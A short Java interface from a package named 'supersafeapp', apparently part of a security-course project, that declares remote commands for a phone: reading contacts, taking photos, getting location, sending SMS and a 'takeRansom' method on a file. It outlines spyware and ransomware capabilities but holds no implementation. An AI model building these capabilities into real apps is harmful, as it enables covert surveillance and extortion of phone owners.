package com.seginf.supersafeapp;

public interface Commandable {
	public void vibrate();
	public void getContactList();
	public void takePhoto();
	public void takeRansom(String filename);
	public void sendSMS(String nro,String mensaje);
	public void getLocation();
}
